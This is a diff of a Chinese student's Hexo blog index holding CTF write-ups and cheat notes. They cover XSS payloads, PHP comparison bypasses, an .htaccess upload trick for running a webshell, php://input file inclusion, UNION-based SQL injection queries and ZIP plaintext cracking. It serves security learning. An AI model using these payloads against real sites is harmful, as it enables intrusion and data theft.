-    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
-<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
-<p>0.作为一只程序猿，有自己的博客听起来更屌一点。</p>
-<p>1.记录和分享一些学到的东西。</p>
-<p>2.倒逼自己去学一些新东西。</p>
-<p>搭这个博客用的是Github Page + Hexo框架+Ayer主题。有一说一，<strong>hexo</strong> 用起来是真的方便，简单又实用，并且因为它是一个开源框架，所以在github可以找到各式各样的hexo主题，多花点时间总能找到自己喜欢的那一款。虽然陆陆续续研究了一两天也只是弄了个大概，一些功能还没完善，但看起来还是比CSDN好看多了不是？😬</p>
-<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
-<p>中南大学信息安全专业18级菜鸡一只</p>
-<p>学习方向：后端开发，渗透测试</p>
-<p>喜欢健身，徒步，游戏</p>
-<p>qq：1755936129</p>
-<p>邮箱：1755936129@qq.com</p>
-<p>欢迎交流 ~</p>
-]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
   </entry>
   <entry>
     <title>MS17-010漏洞复现</title>
@@ -284,32 +317,222 @@
       </tags>
   </entry>
   <entry>
-    <title>Bugku-刷题总结</title>
-    <url>/2020/05/21/CTF/Bugku/Bugku%20%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>html代码限制输入：直接f12修改html代码</p>
-<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串，绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
-<p>md5判断绕过：GET（或者POST）传参<code>username[]=1&amp;password[]=2</code> ,那么<code>$_GET['username'] === $_GET['password']</code> 为真</p>
+    <title>XSS</title>
+    <url>/2020/08/03/CTF/Web/XSS/</url>
+    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"test"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>web</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
+        <tag>漏洞</tag>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>Bugku Web3</title>
-    <url>/2020/05/21/CTF/Bugku/Bugku_Web3/</url>
-    <content><![CDATA[<h2 id="题目地址"><a class="header-anchor" href="#题目地址"></a>题目地址</h2>
-<p><a href="http://123.206.87.240:8002/web3/">http://123.206.87.240:8002/web3/</a></p>
-<h2 id="描述"><a class="header-anchor" href="#描述"></a>描述</h2>
-<p>进去以后点不完的弹窗，直接禁用弹窗，查看源码，发现注释</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span><br></pre></td></tr></table></figure>
-<p>猜测这些数字可能是ASCII码值，尝试写一个python脚本译码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str &#x3D; &#39;&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;&#39;</span><br><span class="line">key &#x3D; str.split(&#39;;&#39;)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in key:</span><br><span class="line">    if len(i)&gt;2:</span><br><span class="line">        b &#x3D; int(i[2:])</span><br><span class="line">        flag +&#x3D; chr(b)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-<p>// 一开始忘了处理最后的空白字符串，导致在<code>int()</code>那里一直报错。。。</p>
-<p>最后得到flag</p>
-<p><img src="/2020/05/21/CTF/Bugku/Bugku_Web3/image-20200521220503932.png" alt="image-20200521220503932"></p>
+    <title>sql注入</title>
+    <url>/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
+<h3 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h3>
+<ol>
+<li>
+<p>查询表中的所有记录，但页面只返回1条（前几条）怎么办？</p>
+<p>使用字符串连接函数：<code>concat()</code> , <code>concat_ws()</code> , <code>group_concat()</code> 等将多条记录的某个字段合并成一个字符串</p>
+<p>eg:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">name</span>) <span class="keyword">from</span> security.user;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/image-20200810162953419.png" alt="image-20200810162953419"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计</title>
+    <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
+<h3 id="1-MD5"><a class="header-anchor" href="#1-MD5"></a>1. MD5</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a[]&#x3D;1;</span><br><span class="line">$b[]&#x3D;2;</span><br><span class="line">md5($a)&#x3D;&#x3D;&#x3D;md5($b);	&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+<hr>
+<p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
+<p>以下这些字符串，md5哈希之后都是0e开头的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;比较特殊的一个，加密前后进行比较的话会判断为相等</span><br><span class="line">0e215962017</span><br><span class="line">0e291242476940776845150308577824</span><br></pre></td></tr></table></figure>
+<h3 id="2-intval"><a class="header-anchor" href="#2-intval"></a>2. intval</h3>
+<p>得到一个数的整型值。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'0x1A'</span>);				  <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>比如在以下代码中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span>(intval($a)&lt;<span class="number">2020</span> &amp;&amp; intval($a+<span class="number">1</span>)&gt;<span class="number">2020</span>)</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
+<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;0x10ff	&#x2F;&#x2F;在进行+1运算时，$a会被转换为数值型进行运算.</span><br></pre></td></tr></table></figure>
+<h3 id="3-is-numeric"><a class="header-anchor" href="#3-is-numeric"></a>3. is_numeric</h3>
+<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
+<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
+<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
+<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
+<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
+<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+<p>简单的文件包含题。</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
+<p>在phpinfo中可以发现</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
+<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
+<p>尝试发现确实可行</p>
+<p>现在我们就可以任意执行php代码了</p>
+<p>对当前文件夹进行目录遍历</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
+<p>输出文件内容即可得到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>压缩包破解</title>
+    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
+    <content><![CDATA[<h2 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h2>
+<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
+<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
+<p>而压缩包中也存在该文件</p>
+<p>考虑ZIP明文攻击</p>
+<ol>
+<li>
+<p>将 readme.txt 压缩为 readme.zip</p>
+</li>
+<li>
+<p>使用 bandzip 打开，查看CRC校验码</p>
+</li>
+<li>
+<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
+</li>
+<li>
+<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
+<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>杂项</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CTF/比赛/国赛2020</title>
+    <url>/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
+<p>助力即可得到flag</p>
+<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
+<p>解压得到二进制文件:flag</p>
+<p>使用winhex打开</p>
+<p>观察到</p>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
+<p>即flag的值</p>
+<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
+<p>解压缩包得到disk_dump文件</p>
+<p>使用file 命令查看信息</p>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
+<p>可以看到是ext3的文件系统</p>
+<p>挂载到 test文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
+<p>查看???.png，提示flag已被删除</p>
+<p>使用extundelete恢复被删除的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
+<p>得到flag.txt，但打开后是乱码</p>
+<p>返回test/misc01文件夹下，看到可执行文件demo</p>
+<p>使用strings命令查看</p>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
+<p>猜测demo对flag.txt进行了处理</p>
+<p>使用ida反编译查看其伪源码</p>
+<p><img src="/2020/08/20/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
+<p>编写代码对flag文件进行解码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解码后得到flag</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ACTF校赛Web</title>
+    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
+<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
+<p>关注公众号，回复“一句话”即可</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
+<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
+<p>列换位密码，用密码学实验的脚本跑一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
+<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
+<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<p>一个数字型SQL回显注入</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/ACTF%E6%A0%A1%E8%B5%9BWeb%5Cimage-20200529222156910.png" alt="image-20200529222156910"></p>
+<p>首先猜出字段数为4</p>
+<p>联合查询得到数据库名</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
+<p>数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
+<p>列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
+<p>读取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
+<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -340,66 +563,34 @@
       </tags>
   </entry>
   <entry>
-    <title>ACTF校赛Web</title>
-    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
-    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
-<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
-<p>关注公众号，回复“一句话”即可</p>
-<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
-<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
-<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
-<p>列换位密码，用密码学实验的脚本跑一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
